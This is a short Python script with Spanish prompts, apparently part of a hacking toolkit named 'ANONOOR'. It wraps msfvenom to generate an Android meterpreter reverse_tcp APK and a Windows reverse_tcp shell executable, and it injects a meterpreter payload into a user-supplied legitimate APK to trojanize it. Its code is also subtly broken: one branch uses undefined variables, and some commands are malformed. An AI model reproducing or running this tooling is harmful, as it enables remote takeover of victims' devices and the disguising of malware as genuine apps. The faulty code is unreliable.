import sys
import os
import time
from colorama import Fore




def payload():
    opcion = input(Fore.RED + """
    ----------""" + Fore.RESET + """
    Plataforma:
    01)Android
    02)Windows
    03)Injectar APK original""" + Fore.RED +"""
    ----------:""" + Fore.RESET)
    print("\nespera un momento porfavor")
    if opcion == "1" or opcion == "01":
        os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > {2}.apk > /dev/null 2>&1".format(host, port, name))
        if os.path.exists("{0}.apk".format(name)):
            print("Payload creado con exito!")
            time.sleep(5)
        else:
            print("Ha ocurrido un error :(, intentalo de nuevo")
            time.sleep(5)
    if opcion == "2" or opcion == "02":
        os.system("msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST={0} LPORT{1} -f exe -o {2}.exe > /dev/null 2>&1".format(lhost, lport, name,))
        if os.path.exists("{0}.exe".format(name)):
            print("Payload creado con exito!")
            time.sleep(5)
        else:
            print("Ha ocurrido un error :(, intentalo de nuevo")
            time.sleep(5)
    if opcion == "3" or opcion == "03":
        a = input("Ubicacion de APK original: ")
        if os.path.exists(str(a)):
            os.system("msfvenom -x {0} -p android/meterpreter/reverse_tcp LHOST={1} LPORT{2} > {3}.apk".format(a, host, port, name))
            if os.path.exists(f"{name}.apk"):
                print("Se ha injectado correctamente, verifica si funciona")
        else:
            print("has escrito bien la ubicacion?")
            time.sleep(3)

        

if __name__ == "__main__":
    print("Intentas ejecutar esto fuera de ANONOOR?")
else:
    host = input(Fore.RESET + "LHOST: ")
    port = input("LPORT: ")
    name = input("NOMBRE: ")
    payload()